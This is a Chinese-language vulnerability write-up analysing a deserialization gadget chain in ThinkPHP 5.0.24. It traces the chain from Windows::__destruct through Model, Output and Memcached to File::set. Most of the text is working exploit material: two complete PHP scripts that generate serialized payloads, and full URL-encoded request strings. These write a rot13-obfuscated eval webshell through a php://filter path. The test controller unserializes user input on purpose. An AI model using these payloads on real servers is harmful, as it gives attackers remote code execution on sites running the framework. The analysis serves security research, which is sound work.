# ThinkPHP5.0.x 反序列化

Author: H3rmesk1t

Data: 2021.08.19

# 漏洞环境
- 漏洞测试环境：PHP5.6+ThinkPHP5.0.24
- 漏洞测试代码 application/index/controller/Index.php
```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
	    $Gyan = unserialize($_GET['d1no']);
    	var_dump($Gyan);
      return '<style type="text/css">*{ padding: 0; margin: 0; } .think_default_text{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"<h1>:)</h1><pThinkPHP V5<br/><span style="font-size:30px">十年磨一剑 - 为API开发设计的高性能框架</span></p><span style="font-size:22px;">[ V5.0 版本由 <a href="http://www.qiniu.com" target="qiniu">七牛云</a独家赞助发布 ]</span></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="ad_bd568ce7058a1091"></think>';
    }
}
```
# 漏洞分析
- 先全局搜索一下 `__destruct` 方法
- 跟进 `thinkphp/library/think/process/pipes/Windows.php` 中的 `__destruct` 方法，发现其调用了 `removeFiles` 方法

<img src="https://pic.imgdb.cn/item/611ca40c4907e2d39c9900e0.png" alt="">

<img src="https://pic.imgdb.cn/item/611ca40c4907e2d39c9901ad.png" alt="">

- 跟进 `removeFiles` 方法
- 可以利用 `file_exists` 函数来触发任意类的 `__toString` 方法

<img src="https://pic.imgdb.cn/item/611ca5614907e2d39ca3ce57.png" alt="">

- 全局搜索一下 `__toString` 方法
- 跟进 `thinkphp/library/think/Model.php` 中的 `__toString` 方法，发现其调用了 `toJson` 方法

<img src="https://pic.imgdb.cn/item/611ca62c4907e2d39caa0984.png" alt="">

<img src="https://pic.imgdb.cn/item/611ca62c4907e2d39caa098e.png" alt="">

- 由于 `toJson` 方法的返回结果中先调用了 `toArray` 方法，`toArray` 方法中存在三个地方可以触发 `__call` 方法，利用 `$value->getAttr($attr)` 来触发

<img src="https://pic.imgdb.cn/item/611caa894907e2d39ccae4d0.png" alt="">

- 走到 else 之后要继续往下走的话先要判断 `$modelRelation`，该变量的值来自 `$this->$relation()`，继而调用 `Loader::parseName` 方法，该方法需要传入变量 `$name`，继续往上回溯，由于 `$this->append` 是可控的，所以 `$name` 也是可控的，这里可以利用 `Model` 类中的 `getError` 方法

<img src="https://pic.imgdb.cn/item/611cada04907e2d39ce066f2.png" alt="">

- 接着判断一下 `$value` 的值，其调用 `getRelationData` 方法，传入 `$modelRelation`，且需要 `Relation` 类型，进入该方法后先进行 `if` 条件判断

```php
$this->parent && !$modelRelation->isSelfRelation() && get_class($modelRelation->getModel()) == get_class($this->parent)
```
- 跟进一下 `isSelfRelation` 方法和 `getModel` 方法，发现都是可控的

<img src="https://pic.imgdb.cn/item/611caf644907e2d39cebc58a.png" alt="">

<img src="https://pic.imgdb.cn/item/611caf644907e2d39cebc599.png" alt="">

<img src="https://pic.imgdb.cn/item/611caf644907e2d39cebc5ac.png" alt="">

- 由于可利用的 `__call` 方法选择的是 `think\console\Output` 类，所以前面的 `$value` 一定是 `think\console\Output` 类对象，所以 `getRelationData` 方法中的 `$this->parent` 肯定也是 `think\console\Output` 类对象
- 这里的 `get_class` 方法要求 `$modelRelation->getModel()` 和 `$this->parent` 为同类，也就是要求 `$value->getAttr($attr)` 中的 `$value` 和上面简单可控的 `model` 为同类，这样就控制了 `$value->getAttr($attr)` 中的 `$value`
- 继续跟下去查看 `$attr`，其值回溯到 `$bindAttr = $modelRelation->getBindAttr();` 中，跟进 `thinkphp/library/think/model/relation/OneToOne.php` 中，`binAttr` 是可控的，至此代码执行到 `$item[$key] = $value ? $value->getAttr($attr) : null;` 就能够执行 `Output` 类 `__call` 魔术方法

<img src="https://pic.imgdb.cn/item/611cb4364907e2d39c059602.png" alt="">

- 跟进 `Output` 类 `block` 方法

<img src="https://pic.imgdb.cn/item/611cb4c34907e2d39c083122.png" alt="">

<img src="https://pic.imgdb.cn/item/611cb51e4907e2d39c09d107.png" alt="">

- 继续跟进 `writelin` 方法，发现调用 `write` 方法

<img src="https://pic.imgdb.cn/item/611d46d14907e2d39c203ceb.png" alt="">

- 这里 `$this->handle` 可控，全局搜索 `write` 方法进一步利用，跟进 `thinkphp/library/think/session/driver/Memcached.php`

<img src="https://pic.imgdb.cn/item/611d47814907e2d39c220574.png" alt="">

- 继续搜索可用 `set` 方法，跟进 `thinkphp/library/think/cache/driver/File.php`，可以直接执行 `file_put_contents` 方法写入 `shell`，`$filename` 可控且可以利用伪协议绕过死亡 `exit`


<img src="https://pic.imgdb.cn/item/611d47d34907e2d39c22d614.png" alt="">

- `$data` 值比较棘手，由于最后调用 `set` 方法中的参数来自先前调用的 `write` 方法只能为 `true`，且这里 `$expire` 只能为数值，这样文件内容就无法写 `shell`

<img src="https://pic.imgdb.cn/item/611d49004907e2d39c25c81b.png" alt="">

<img src="https://pic.imgdb.cn/item/611d49004907e2d39c25c834.png" alt="">

- 继续执行，跟进下方的 `setTagItem` 方法，会再执行一次 `set` 方法，且这里文件内容 `$value` 通过 `$name` 赋值(文件名)，所以可以在文件名上做手脚，例如

```php
php://filter/write=string.rot13/resource=./<?cuc cucvasb();?>
```

- 这里参考osword师傅分析的 `POP链构造图`

<img src="https://pic.imgdb.cn/item/611d4a3c4907e2d39c28e08c.png" alt="">

# EXP
- 由于 `windows`对文件名有限制，会写入失败，所以该漏洞在 `windows` 环境下无法进行复现
```php
<?php
namespace think\process\pipes;
use think\model\Pivot;
class Pipes{

}

class Windows extends Pipes{
    private $files = [];

    function __construct(){
        $this->files = [new Pivot()];
    }
}

namespace think\model;#Relation
use think\db\Query;
abstract class Relation{
    protected $selfRelation;
    protected $query;
    function __construct(){
        $this->selfRelation = false;
        $this->query = new Query();#class Query
    }
}

namespace think\model\relation;#OneToOne HasOne
use think\model\Relation;
abstract class OneToOne extends Relation{
    function __construct(){
        parent::__construct();
    }

}
class HasOne extends OneToOne{
    protected $bindAttr = [];
    function __construct(){
        parent::__construct();
        $this->bindAttr = ["no","123"];
    }
}

namespace think\console;#Output
use think\session\driver\Memcached;
class Output{
    private $handle = null;
    protected $styles = [];
    function __construct(){
        $this->handle = new Memcached();//目的调用其write()
        $this->styles = ['getAttr'];
    }
}

namespace think;#Model
use think\model\relation\HasOne;
use think\console\Output;
use think\db\Query;
abstract class Model{
    protected $append = [];
    protected $error;
    public $parent;#修改处
    protected $selfRelation;
    protected $query;
    protected $aaaaa;

    function __construct(){
        $this->parent = new Output();#Output对象,目的是调用__call()
        $this->append = ['getError'];
        $this->error = new HasOne();//Relation子类,且有getBindAttr()
        $this->selfRelation = false;//isSelfRelation()
        $this->query = new Query();

    }
}

namespace think\db;#Query
use think\console\Output;
class Query{
    protected $model;
    function __construct(){
        $this->model = new Output();
    }
}

namespace think\session\driver;#Memcached
use think\cache\driver\File;
class Memcached{
    protected $handler = null;
    function __construct(){
        $this->handler = new File();//目的调用File->set()
    }
}
namespace think\cache\driver;#File
class File{
    protected $options = [];
    protected $tag;
    function __construct(){
        $this->options = [
        'expire'        =0,
        'cache_subdir'  =false,
        'prefix'        ='',
        'path'          ='php://filter/write=string.rot13/resource=./<?cuc cucvasb();riny($_TRG[q1ab])?>',
        'data_compress' =false,
        ];
        $this->tag = true;
    }
}

namespace think\model;
use think\Model;
class Pivot extends Model{


}
use think\process\pipes\Windows;
echo urlencode(serialize(new Windows()));
```
- 生成文件名规则

```bash
md5('tag_'.md5($this->tag))
即:
md5('tag_c4ca4238a0b923820dcc509a6f75849b')
=>3b58a9545013e88c7186db11bb158c44
=>
<?cuc cucvasb();riny($_TRG[pzq]);?+ 3b58a9545013e88c7186db11bb158c44
最终文件名：
<?cuc cucvasb();riny($_TRG[pzq]);?>3b58a9545013e88c7186db11bb158c44.php
```
- 在漏洞利用时需注意目录读写权限，可先控制 `options['path'] = './demo/'`，利用框架创建一个 `755` 文件夹（前提是具有权限），我们可以稍微修改下 payload 用于创建一个 `0755` 权限的目录（这里利用的是 `think\cache\driver\File:getCacheKey()` 中的 `mkdir` 函数），然后再往这个目录写文件
- poc 创建 demo 目录

```php
<?php
namespace think\process\pipes;
use think\model\Pivot;
class Pipes{

}

class Windows extends Pipes{
    private $files = [];

    function __construct(){
        $this->files = [new Pivot()];
    }
}

namespace think\model;#Relation
use think\db\Query;
abstract class Relation{
    protected $selfRelation;
    protected $query;
    function __construct(){
        $this->selfRelation = false;
        $this->query = new Query();#class Query
    }
}

namespace think\model\relation;#OneToOne HasOne
use think\model\Relation;
abstract class OneToOne extends Relation{
    function __construct(){
        parent::__construct();
    }

}
class HasOne extends OneToOne{
    protected $bindAttr = [];
    function __construct(){
        parent::__construct();
        $this->bindAttr = ["no","123"];
    }
}

namespace think\console;#Output
use think\session\driver\Memcached;
class Output{
    private $handle = null;
    protected $styles = [];
    function __construct(){
        $this->handle = new Memcached();//目的调用其write()
        $this->styles = ['getAttr'];
    }
}

namespace think;#Model
use think\model\relation\HasOne;
use think\console\Output;
use think\db\Query;
abstract class Model{
    protected $append = [];
    protected $error;
    public $parent;#修改处
    protected $selfRelation;
    protected $query;
    protected $aaaaa;

    function __construct(){
        $this->parent = new Output();#Output对象,目的是调用__call()
        $this->append = ['getError'];
        $this->error = new HasOne();//Relation子类,且有getBindAttr()
        $this->selfRelation = false;//isSelfRelation()
        $this->query = new Query();

    }
}

namespace think\db;#Query
use think\console\Output;
class Query{
    protected $model;
    function __construct(){
        $this->model = new Output();
    }
}

namespace think\session\driver;#Memcached
use think\cache\driver\File;
class Memcached{
    protected $handler = null;
    function __construct(){
        $this->handler = new File();//目的调用File->set()
    }
}
namespace think\cache\driver;#File
class File{
    protected $options = [];
    protected $tag;
    function __construct(){
        $this->options = [
        'expire'        =0,
        'cache_subdir'  =false,
        'prefix'        ='',
        'path'          ='./demo/',
        'data_compress' =false,
        ];
        $this->tag = true;
    }
}

namespace think\model;
use think\Model;
class Pivot extends Model{


}
use think\process\pipes\Windows;
echo urlencode(serialize(new Windows()));
```
# 漏洞复现
- 先创建一个 demo 目录

```bash
[payload=](http://192.168.246.129/public/index.php?d1no=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A6%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A2%3A%22no%22%3Bi%3A1%3Bs%3A3%3A%22123%22%3B%7Ds%3A15%3A%22%00%2A%00selfRelation%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A7%3A%22.%2Fdemo%2F%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A7%3A%22.%2Fdemo%2F%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7Ds%3A15%3A%22%00%2A%00selfRelation%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A7%3A%22.%2Fdemo%2F%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7Ds%3A8%3A%22%00%2A%00aaaaa%22%3BN%3B%7D%7D%7D)
```
- 往这个目录写文件
```bash
[payload](http://192.168.246.129/public/index.php?d1no=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A6%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A2%3A%22no%22%3Bi%3A1%3Bs%3A3%3A%22123%22%3B%7Ds%3A15%3A%22%00%2A%00selfRelation%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A83%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dstring.rot13%2Fresource%3D.%2Fdemo%2F%3C%3Fcuc+cucvasb%28%29%3Briny%28%24_TRG%5Bq1ab%5D%29%3F%3E%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A83%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dstring.rot13%2Fresource%3D.%2Fdemo%2F%3C%3Fcuc+cucvasb%28%29%3Briny%28%24_TRG%5Bq1ab%5D%29%3F%3E%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7Ds%3A15%3A%22%00%2A%00selfRelation%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A83%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dstring.rot13%2Fresource%3D.%2Fdemo%2F%3C%3Fcuc+cucvasb%28%29%3Briny%28%24_TRG%5Bq1ab%5D%29%3F%3E%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7Ds%3A8%3A%22%00%2A%00aaaaa%22%3BN%3B%7D%7D%7D)
```
<img src="https://pic.imgdb.cn/item/611d63c84907e2d39c552b9e.png" alt="">

<img src="https://pic.imgdb.cn/item/611d63c84907e2d39c552ba4.png" alt="">

